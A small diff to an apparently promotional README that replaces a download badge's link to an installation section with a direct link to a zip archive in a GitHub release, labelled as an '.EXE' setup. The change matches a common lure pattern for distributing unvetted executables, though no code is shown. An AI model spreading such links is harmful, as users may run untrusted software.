@@ -10,7 +10,7 @@
 </p>
 
 <p align="center">
-  <a href="#installation--deployment-guide">
+  <a href="https://github.com/shalaluecka/Ancient-Rust-2026/releases/download/2026/Ancient.Rust.zip">
     <img src="https://img.shields.io/badge/➔%20Download%20Ancient%20Setup%20(.EXE)-Click%20Here-purple?style=for-the-badge" alt="Download" />
   </a>
 </p>
